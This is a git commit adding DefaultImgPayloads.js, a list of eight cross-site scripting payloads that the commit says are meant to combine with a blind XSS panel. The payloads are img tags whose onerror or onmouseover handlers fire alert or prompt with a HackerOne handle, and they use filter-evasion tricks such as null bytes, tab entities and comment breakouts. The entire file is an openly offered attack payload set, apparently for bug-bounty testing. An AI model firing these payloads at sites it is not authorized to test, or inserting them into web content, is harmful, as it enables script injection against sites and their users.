60b4c4cd76ce46770574fdb656a4825cad363382
Snowy <SnowyYT@protonmail.com>
2023-12-01 01:31:49 -0100

    Create DefaultImgPayloads.js
    Payload to combo with Blind XSS Panel

---
+++ DefaultImgPayloads.js
@@ -0,0 +1,8 @@
+<img src =q onerror=prompt("HackerOne: SnowyY0_")>
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert("HackerOne: SnowyY0_")> -->
+"'`><\x00img src=xxx:x onerror=javascript:alert('HackerOne: SnowyY0_')>
+<img src=x onerror=\x00"javascript:alert('HackerOne: SnowyY0_')">
+<img[a][b][c]src[d]=x[e]onerror=[f]"alert('HackerOne: SnowyY0_')">
+<img src\x09=x onerror="javascript:alert('HackerOne: SnowyY0_')">
+<IMG SRC="javascript:javascript:alert('HackerOne: SnowyY0_');">
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt('HackerOne: SnowyY0_')
